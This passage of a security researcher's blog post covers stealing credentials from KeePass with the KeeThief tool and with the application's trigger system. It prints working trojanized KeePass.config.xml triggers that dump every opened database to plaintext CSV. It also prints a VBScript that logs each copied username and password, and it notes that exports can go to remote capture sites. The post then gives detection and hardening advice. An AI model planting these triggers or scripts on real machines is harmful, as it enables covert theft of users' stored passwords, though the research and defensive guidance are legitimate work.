+<p><span style="font-weight: 400;">This patched KeePass version is located in the <a href="https://github.com/adaptivethreat/KeeThief/tree/master/KeePass-2.34-Source-Patched">./KeePass-2.34-Source-Patched/</a> folder.</span></p>
+<p><span style="font-weight: 400;">Also, since we&#8217;re not relying upon a keylogger to extract the master password, KeePass&#8217; </span><a href="http://keepass.info/help/kb/sec_desk.html"><span style="font-weight: 400;">Secure Desktop</span></a><span style="font-weight: 400;"> feature (which prompts for the input of credentials in a high-integrity context similar to UAC) doesn&#8217;t come into play.</span><i><span style="font-weight: 400;"> If the database is unlocked, the key material likely has to be somewhere in the process space, so we can probably extract it</span></i><span style="font-weight: 400;">.</span></p>
+<h2>KeeThief vs. KeeFarce</h2>
+<p><span style="font-weight: 400;">So why use KeeThief over KeeFarce?</span></p>
+<p>KeeThief will decrypt the plaintext of the master database password, which could prove useful if reused. KeeThief is also built as a fully self-contained .NET assembly (instead of multiple files that are required to be on disk), so we can also load and execute it in a PowerShell script without touching disk. This is something KeeFarce is definitely capable of as well with a bit of refactoring, but the process will be more complex as it includes more unmanaged code, and a reflective DLL would likely need to be used. KeeFarce also uses the current public version of CLR MD, which by default is only compatible with .NET 4.0; this means that it won&#8217;t work with the stock PowerShell 2.0 installation on Windows 7, as powershell.exe is built against version 2.0 by default. <a href="https://github.com/adaptivethreat/KeeThief/tree/master/KeeTheft/ClrMD">Lee customized CLR MD</a> to allow for compatibility with the 2.0 .NET CLR so KeeThief will work out of the box on stock Windows 7 installations.</p>
+<p><span style="font-weight: 400;">The downside is that KeeThief will not (yet) pull out all passwords contained in the currently opened database as KeeFarce does. You will need to run the key extraction and also download the target KeePass database.</span></p>
+<h2>Persistently Mining KeePass</h2>
+<p><span style="font-weight: 400;">&#8220;</span><i><span style="font-weight: 400;">But wait, this requires the database to be unlocked right? I have autolock settings and only open my database for a few minutes at a time, so I&#8217;m safe.</span></i><span style="font-weight: 400;">&#8220;</span></p>
+<p><span style="font-weight: 400;">Yes, agreed, the database must be unlocked in order to walk the proper objects on the KeePass heap. But admins who use KeePass tend to actually </span><b>use</b><span style="font-weight: 400;"> KeePass at some point, so let&#8217;s think of a way to trigger out key extraction logic at the right moment. </span></p>
+<p><span style="font-weight: 400;">The easiest method is to leave a hidden PowerShell script running that loops on an interval, enumerating any KeePass processes for key material and exiting once results are found. Note that this doesn&#8217;t require administrative rights, if we do happen to have admin rights on a target domain user&#8217;s machine (which isn&#8217;t unlikely in a real engagement unless this machine is the initial pivot) we can use WMI subscriptions similar to the first post to fire off the KeeThief logic. These are exercises left to the reader, but we can confirm that a proof-of-concept works.</span></p>
+<h2>Exfiltration Without Malware &#8211; KeePass&#8217; Trigger System</h2>
+<p>If your only goal is to extract the password entries for any opened database, there&#8217;s an even easier way that doesn&#8217;t involve heap enumeration or code injection.</p>
+<p><span style="font-weight: 400;">Lee noticed KeePass 2.X’s extensive  </span><span style="font-weight: 400;"><a href="http://keepass.info/help/v2/triggers.html">“trigger” framework</a>,</span><span style="font-weight: 400;"> which lets you execute specific </span><a href="http://keepass.info/help/v2/triggers.html#actions"><span style="font-weight: 400;">actions</span></a><span style="font-weight: 400;"> when certain KeePass </span><a href="http://keepass.info/help/v2/triggers.html#events"><span style="font-weight: 400;">events</span></a><span style="font-weight: 400;"> occur. The most interesting events for us are “<em>Opened database file</em>” which fires after a database file has been opened successfully, and “<em>Copied entry data to clipboard</em>” which will fire whenever usernames/passwords are copied to the clipboard. Two interesting actions are “<em>Execute command line / URL</em>”, which can execute shell commands, and “<em>Export active database</em>”, which can export the currently active database to a specified location. If we have write access to the KeePass.config.xml file linked to the currently running KeePass installation, we can trojanize the configuration XML to either launch KeeThief on database unlock (through the command line trigger) or export the database à la KeeFarce. Remember that KeePass.config.xml is <a href="http://keepass.info/help/base/configuration.html">located in the same directory</a> as a portable KeePass.exe instance or at %APPDATA%\KeePass\KeePass.config.xml for an installed instance. You can use <a href="https://github.com/adaptivethreat/KeeThief/blob/9e60798ba51d03de687bbc1a5248f12032b01951/PowerShell/KeePassConfig.ps1#L3-L294">Find-KeePassconfig</a> to enumerate all config locations.</span></p>
+<p><span style="font-weight: 400;">For example, if you add the following to a KeePass.config.xml it will dump each opened database to <strong>C:\Temp\&lt;database_name&gt;.csv</strong>, regardless of additional key files/user account mixins (this is <a href="http://keepass.info/help/kb/trigger_examples.html#export">actually an example</a> from KeePass):</span></p>
+<pre class="lang:default decode:true">&lt;TriggerSystem&gt;
+	&lt;Triggers&gt;
+		&lt;Trigger&gt;
+			&lt;Guid&gt;/N3TZZT7nUyA9HdvwKgcig==&lt;/Guid&gt;
+			&lt;Name&gt;dumpty dump dump&lt;/Name&gt;
+			&lt;Events&gt;
+				&lt;Event&gt;
+					&lt;TypeGuid&gt;5f8TBoW4QYm5BvaeKztApw==&lt;/TypeGuid&gt;
+					&lt;Parameters&gt;
+						&lt;Parameter&gt;0&lt;/Parameter&gt;
+						&lt;Parameter /&gt;
+					&lt;/Parameters&gt;
+				&lt;/Event&gt;
+			&lt;/Events&gt;
+			&lt;Conditions /&gt;
+			&lt;Actions&gt;
+				&lt;Action&gt;
+					&lt;TypeGuid&gt;D5prW87VRr65NO2xP5RIIg==&lt;/TypeGuid&gt;
+					&lt;Parameters&gt;
+						&lt;Parameter&gt;C:\Temp\{DB_BASENAME}.csv&lt;/Parameter&gt;
+						&lt;Parameter&gt;KeePass CSV (1.x)&lt;/Parameter&gt;
+						&lt;Parameter /&gt;
+						&lt;Parameter /&gt;
+					&lt;/Parameters&gt;
+				&lt;/Action&gt;
+			&lt;/Actions&gt;
+		&lt;/Trigger&gt;
+	&lt;/Triggers&gt;
+&lt;/TriggerSystem&gt;</pre>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3223" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/keepass_trigger.gif" alt="keepass_trigger" width="960" height="600" /></p>
+<p>The &#8220;<em>Export active database</em>&#8221; action also accepts \\UNC paths as well as URLs, so you could build a trigger that exfiltrates a .csv export of any database to a capture site as soon as it&#8217;s opened.</p>
+<p>The “<em>Copied entry data to clipboard</em>” event is great as well when paired with the “<em>Execute command line / URL</em>” action. In order to prevent a window from showing to the user (as it would if we launched powershell.exe or cmd.exe) let&#8217;s call C:\Windows\System32\wscript.exe to trigger a .vbs file stored on disk that will handle the local storage (or remote exfiltration) of any credential entry that&#8217;s copied to the clipboard. Here&#8217;s the exfil.vbs file and the XML trigger configuration:</p>
+<pre class="lang:vb decode:true " title="exfil.vbs">' Store the arguments in a variable:
+Set objArgs = Wscript.Arguments
+
+' Open the specified file for writing
+Dim oFS : Set oFS = CreateObject("Scripting.FileSystemObject")
+Dim objFile : Set objFile = oFS.OpenTextFile("C:\Temp\exfil.txt", 8, True)
+    
+' Iterate through each argument
+For Each strArg in objArgs
+    objFile.Write strArg &amp; ","
+Next
+objFile.Write vbCrLf
+
+objFile.Close</pre>
+<pre class="lang:default decode:true">&lt;TriggerSystem&gt;
+    &lt;Triggers&gt;
+        &lt;Trigger&gt;
+            &lt;Guid&gt;/N3TZZT7nUyA9HdvwKgcig==&lt;/Guid&gt;
+            &lt;Name&gt;dumpty dump dump&lt;/Name&gt;
+            &lt;Events&gt;
+                &lt;Event&gt;
+                    &lt;TypeGuid&gt;P35exipUTFiVRIX78m9W3A==&lt;/TypeGuid&gt;
+                    &lt;Parameters&gt;
+                        &lt;Parameter&gt;0&lt;/Parameter&gt;
+                        &lt;Parameter /&gt;
+                    &lt;/Parameters&gt;
+                &lt;/Event&gt;
+            &lt;/Events&gt;
+            &lt;Conditions /&gt;
+            &lt;Actions&gt;
+                &lt;Action&gt;
+                    &lt;TypeGuid&gt;2uX4OwcwTBOe7y66y27kxw==&lt;/TypeGuid&gt;
+                    &lt;Parameters&gt;
+                        &lt;Parameter&gt;C:\Windows\System32\wscript.exe&lt;/Parameter&gt;
+                        &lt;Parameter&gt;C:\Temp\exfil.vbs "{TITLE}" "{URL}" "{USERNAME}" "{PASSWORD}" "{NOTES}"&lt;/Parameter&gt;
+                        &lt;Parameter&gt;False&lt;/Parameter&gt;
+                    &lt;/Parameters&gt;
+                &lt;/Action&gt;
+            &lt;/Actions&gt;
+        &lt;/Trigger&gt;
+    &lt;/Triggers&gt;
+&lt;/TriggerSystem&gt;</pre>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3245" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/keepass_textcopy.gif" alt="keepass_textcopy" width="960" height="600" /></p>
+<h2>Defenses</h2>
+<p><span style="font-weight: 400;">Both KeeThief and KeeFarce require injecting code into KeePass.exe. This is something that some defensive solutions can catch, as it mirrors other typical shellcode injection processes. The best thing you can do is use a host-based monitoring system and monitor for cross-process interactions with KeePass (opening process handles, allocating/reading/writing memory, and creating remote threads). For example, this could be accomplished (for free!) using Sysmon and Windows Event Forwarding to monitor for abnormal CreateRemoteThread events (Event ID 8) with KeePass.exe as the TargetImage, as well as monitoring the </span><a href="https://twitter.com/markrussinovich/status/746071435047632896"><span style="font-weight: 400;">forthcoming ProcessOpen event</span></a><span style="font-weight: 400;">. Several EDR systems (e.g. CarbonBlack) also have detection capabilities for cross-process interaction.</span></p>
+<p><span style="font-weight: 400;">There&#8217;s not really a good protection against KeePass.config.xml modification. As KeePass states, &#8220;<a href="http://keepass.info/help/base/configuration.html"><em>If you use the KeePass installer and install the program with administrator rights, the program directory will be write-protected when working as a normal/limited user. KeePass will use local configuration files, i.e. save and load the configuration from a file in your user directory</em></a>&#8220;. This means that whether a user is using a portable or installed instance, an attacker within that user&#8217;s context will almost certainly have the ability to insert malicious triggers. You could try to modify the ACLs of the KeePass.config.xmls to remove all write access once you have the settings you want saved, but if the current user is a local administrator this ultimately wouldn&#8217;t be a complete fix. From a defensive standpoint, it would be a good idea to inventory all user KeePass.config.xmls and examine them for malicious triggers. The <a href="https://github.com/adaptivethreat/KeeThief/blob/master/PowerShell/KeePassConfig.ps1">./PowerShell/KeePassConfig.ps1</a> file has methods to do this: <strong>Find-KeePassConfig | Get-KeePassConfigTrigger</strong>.</span></p>
+<p><span style="font-weight: 400;">In addition to host based monitoring, if you enroll KeePass.exe in Microsoft&#8217;s awesome </span><a href="https://www.microsoft.com/en-us/download/details.aspx?id=50766"><span style="font-weight: 400;">Enhanced Mitigation Experience Toolkit</span></a><span style="font-weight: 400;"> (EMET) it will detect the shellcode injection through its EAF mitigation and create a log entry. The bad news is that we still get the key material, so if you see something like the following we’d recommend starting incident response procedures and rolling passwords for accounts in any opened databases:</span></p>
+<p><img loading="lazy" decoding="async" class="aligncenter wp-image-3174 size-full" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/keetheft_emet.png" alt="keetheft_emet" width="2560" height="1513" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/07/keetheft_emet.png 2560w, https://blog.harmj0y.net/wp-content/uploads/2016/07/keetheft_emet-300x177.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/07/keetheft_emet-768x454.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/07/keetheft_emet-1024x605.png 1024w" sizes="(max-width: 2560px) 100vw, 2560px" /></p>
+<p><span style="font-weight: 400;">We should note that while this is a great best practice, it&#8217;s also likely not a silver bullet. Josh Pitts (</span><a href="https://twitter.com/midnite_runr/"><span style="font-weight: 400;">@midnite_runr</span></a><span style="font-weight: 400;">) and Casey Smith (</span><a href="https://twitter.com/subtee"><span style="font-weight: 400;">@subtee</span></a><span style="font-weight: 400;">) did some awesome research this year on &#8220;</span><a href="https://www.okta.com/blog/2016/07/the-emet-serendipity-emets-ineffectiveness-against-non-exploitation-uses/"><i><span style="font-weight: 400;">The EMET Serendipity: EMET&#8217;s (In)Effectiveness Against Non-Exploitation Uses</span></i></a><span style="font-weight: 400;">&#8220;. The tl;dr is that you can bypass EMET with custom shellcode if LoadLibraryA/GetProcAddress is in the IAT of your target process (or one of its libraries) &#8230;which is the case with emet.dll. We&#8217;re assuming that this approach for KeeThief&#8217;s shellcode likely wouldn&#8217;t be too hard for someone with the background and motivation, but using EMET increases the bar and creates another opportunity for the attacker to make a mistake and be detected.</span></p>
+<p><span style="font-weight: 400;">In addition to host-based monitoring, organizations should take steps towards segregating IT workstations from normal day-to-day operations and reducing their reliance on passwords. Building </span><a href="https://technet.microsoft.com/en-us/library/mt634654.aspx"><span style="font-weight: 400;">Privileged Access Workstations</span></a><span style="font-weight: 400;"> and restricting KeePass usage to only those hosts will go a long ways in reducing credential theft in general. In addition, take steps towards using technologies such as </span><a href="https://technet.microsoft.com/en-us/library/hh831782(v=ws.11).aspx"><span style="font-weight: 400;">Group Managed Service Accounts</span></a> so administrators don&#8217;t have to manage passwords at all<span style="font-weight: 400;">. Remember: it’s impossible to steal passwords from KeePass if they’re never stored there in the first place :)</span></p>
+<h2>WrapUp</h2>
+<p><span style="font-weight: 400;">To reiterate from the last KeePass post, KeePass is not “bad” or “vulnerable” – it’s a much better solution than what we see in many environments, and the developers did pretty much everything right when coding it (including strong in-memory protections and DPAPI). Still, some admins/companies sometimes tend to see solutions like this as a silver bullet, so one point of this post is to (again) show that practical attack vectors against KeePass and similar vaults are not unrealistic. Our intention is not to convince anyone NOT to use a password manager (we believe you definitely SHOULD use a password manager), but rather to combat the false sense of security it may give some users.</span></p>
+<p><span style="font-weight: 400;">For those who feel that 2-factor is silver bullet as far as local password managers go, we would caution you yet again: the resulting key material is likely in memory somewhere if the database is unlocked, and the method of unlocking ultimately doesn&#8217;t matter if the KeePass.config.xml is modified. <a href="http://keepass.info/help/base/security.html#secspecattacks">KeePass knows these issues</a> &#8211;</span><span style="font-weight: 400;"> the trigger system was intended functionality</span><span style="font-weight: 400;"> and KeePass doesn&#8217;t <a href="https://sourceforge.net/p/keepass/discussion/329220/thread/8e511d96/#e919">consider tools like KeeFarce a threat</a>. We agree that </span><span style="line-height: 1.5;">protecting your program against a malicious attacker operating in the same security context is an extremely difficult problem.</span></p>
+<p><span style="font-weight: 400;">As an aside, this project was developed off hours by two of our ATD team members purely out of research interest. You can imagine what an advanced adversary with much more talent, funding, time, and manpower could produce against other password manager solutions in a targeted operation.</span></p>
